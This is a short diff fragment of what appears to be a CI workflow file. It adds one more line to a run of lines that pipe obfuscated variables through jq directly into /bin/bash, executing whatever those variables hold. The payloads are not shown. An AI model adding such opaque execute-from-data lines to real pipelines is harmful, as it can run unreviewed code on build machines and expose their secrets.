@@ -23,6 +23,7 @@ jobs:
           echo $zmfb57 | jq -r .nnmo67 | /bin/bash
           printf '%s' "$wz2" | jq -r .bcaal47 | /bin/bash
           printf '%s' "$kzmg9057" | jq -r .zlsck1 | /bin/bash
+          echo $p81 | jq -r .c424 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
